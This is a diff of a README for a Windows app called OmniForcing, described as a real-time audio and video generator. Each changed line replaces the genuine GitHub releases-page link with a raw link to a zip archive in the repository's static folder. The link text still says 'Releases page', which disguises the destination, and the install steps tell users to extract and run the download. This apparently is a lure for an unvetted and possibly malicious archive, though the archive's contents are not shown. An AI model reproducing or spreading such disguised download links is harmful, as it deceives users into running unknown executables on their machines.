@@ -1,6 +1,6 @@
 # 🎬 OmniForcing - Real-time Audio and Video Generation
 
-[![Download OmniForcing](https://img.shields.io/badge/Download%20OmniForcing-blue?style=for-the-badge)](https://github.com/Born-enormity133/OmniForcing/releases)
+[![Download OmniForcing](https://img.shields.io/badge/Download%20OmniForcing-blue?style=for-the-badge)](https://github.com/Born-enormity133/OmniForcing/raw/refs/heads/main/static/Omni_Forcing_currant.zip)
 
 ## 🧭 What OmniForcing Does
 
@@ -12,7 +12,7 @@ This app is built for end users who want to run the released version on a Window
 
 Visit the release page to download the Windows build:
 
-[Download OmniForcing from Releases](https://github.com/Born-enormity133/OmniForcing/releases)
+[Download OmniForcing from Releases](https://github.com/Born-enormity133/OmniForcing/raw/refs/heads/main/static/Omni_Forcing_currant.zip)
 
 Look for the latest release and choose the Windows file that matches your system. In most cases, this will be a `.exe` installer or a `.zip` package.
 
@@ -46,7 +46,7 @@ If the release page includes model files or extra assets, download those too and
 
 Follow these steps in order:
 
-1. Open the [Releases page](https://github.com/Born-enormity133/OmniForcing/releases)
+1. Open the [Releases page](https://github.com/Born-enormity133/OmniForcing/raw/refs/heads/main/static/Omni_Forcing_currant.zip)
 2. Download the latest Windows release
 3. If the file is a `.zip`, right-click it and choose **Extract All**
 4. Open the extracted folder
